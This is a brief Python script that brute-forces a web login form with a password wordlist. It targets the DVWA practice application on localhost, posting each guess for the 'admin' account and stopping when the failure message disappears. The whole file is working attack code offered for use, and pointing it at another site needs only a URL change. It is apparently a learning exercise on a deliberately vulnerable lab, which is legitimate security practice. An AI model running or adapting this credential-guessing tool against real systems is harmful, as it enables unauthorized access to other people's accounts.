#!/usr/bin/env python

import requests


target_url = "http://localhost/dvwa/login.php"
data_dict = {'username':'admin','password':'','Login':'submit'}
# 'username','password','Login' is name of username,password and submit input box in the html form

with open("passwords.txt","r") as paswds:
	for paswd in paswds:
		pswd = paswd.strip()
		data_dict["password"] = pswd
		response = requests.post(target_url, data= data_dict)
		if "Login failed" not in response.content:    # string to identify failed attempt
			print("[+] Got the password --> " + pswd)
			exit()

print("[-] Password is not in the given dictionary.")









'''
basic logic:
target_url = "http://localhost/dvwa/login.php"
data_dict = {'username':'admin','password':'password','Login':'submit'}
response = requests.post(target_url, data= data_dict)
print(response.content)
'''
